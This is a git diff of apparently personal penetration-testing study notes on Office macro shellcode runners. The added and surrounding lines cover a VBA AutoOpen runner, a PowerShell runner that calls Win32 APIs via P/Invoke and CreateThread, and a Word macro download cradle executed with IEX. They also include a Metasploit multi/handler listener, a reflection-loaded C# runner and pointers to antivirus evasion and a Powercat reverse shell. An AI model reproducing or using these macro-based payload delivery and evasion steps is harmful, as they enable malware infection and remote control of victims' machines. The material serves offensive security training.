@@ -211,6 +211,8 @@ The problem is that the downloaded executable may be flagged by network monitori
 
 **VBA Shellcode Runner (partially evade detection)**
 
+This technique imports Win32 API functions from DLLs and runs them as unmanaged code. We require to translate the C argument types to VBA (we can use MSDN) for function declarations.
+
 > [!Requirements]
 > Identify the target architecture to generate the shellcode correctly and know the buffer size.
 
@@ -271,6 +273,9 @@ Sub AutoOpen()
 End Sub
 ```
 
+> [!Note]
+> The parent process of the Shellcode is Word because we are creating a Thread of the main process.
+
 3. Setup a listener:
 ```sh
 msf> use multi/handler
@@ -295,6 +300,10 @@ msf> set AutoRunScript post/windows/manage/migrate
 > - See [[AV Evasion]] for macro obfuscation to reduce VBA detection.
 
 **PowerShell Shellcode Runner (evade detection partially)**
+
+Powershell cannot interact natively with Win32 APIs. But we can use .NET framework to run embedded C# code which can import Win32 API functions by calling unmanage DLL functions.
+
+We must translate the C data types from the Win32 API function parameters to C# data types. We can use **P/Invoke**.
 
 > [!Important]
 > When we run PowerShell code with `Add-Type`, the Visual C# Command-Line Compiler handles the compilation process and writes both the C# source code and the compiled C# assembly temporarily to disk. **This leaves artifacts on the hard drive that antivirus programs can identify**.
@@ -339,10 +348,10 @@ $size = $buf.Length # get the payload size
 
 $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0); # execute the payload
 
-[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF") # pause the script and allow Meterpreter to execute (wait for the CreateThread to finish)
+[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF") # pause the script and allow Meterpreter to execute (wait until we close the shell)
 ```
 
-3. Create the Word Macro that downloads the payload into memory and executes it directly via IEX:
+3. Create the Word Macro that creates a cradle that downloads the payload into memory and executes it directly via IEX:
 ```vb
 Sub MyMacro()
     Dim str As String
@@ -455,7 +464,7 @@ msf> run
 ![[Pasted image 20260704130318.png]]
 
 2. Create a Class and import the necessary DLLs. Also create a runner method that must be available through reflection (public and static):
-```
+```csharp
 public class Class1
 {
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
@@ -503,11 +512,6 @@ $class = $assem.GetType("ClassLibrary1.Class1")
 $method = $class.GetMethod("runner")
 $method.Invoke(0, $null)
 ```
-
-
-
-
-
 
 ---
 # VBA reverse shell macro with Powercat
